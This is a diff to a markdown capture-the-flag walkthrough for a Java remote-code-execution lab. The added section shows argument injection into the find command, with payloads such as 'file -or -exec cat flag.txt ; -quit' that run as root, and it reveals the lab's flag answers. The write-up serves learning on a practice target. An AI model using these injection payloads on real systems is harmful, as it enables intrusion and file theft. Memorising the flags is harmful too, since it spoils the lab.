@@ -84,5 +84,22 @@ lets fix this
 - after correcting use the deploy adn the flag will be shown in the output of the console 
 //Your flag is: JAVA_RCE_DEFENDER
 
+## Lab 3:FFF:
+- Start you machine 
+- Go to http://www.hacktory.lab
+- try find -help
+- the question is Which argument of the find command could be potentially used by an attacker ?
+- the answer is -exec
+- try to enter file -or -exec whoami ; -quit
+- the output is root
+- try file -or -exec ls ; -quit.
+- we can see the list of the files
+- and we can see a file called flag.txt
+- we wanna see the content of this i am thinking in the command of cat
+- `;cat flag.txt;` i didnt get any result 
+- try this command `file -or -exec cat flag.txt ; -quit`
+- the flag  ` **java_rce_find_escaper**`
+- close your machine
+- Good luck from kader
     
 
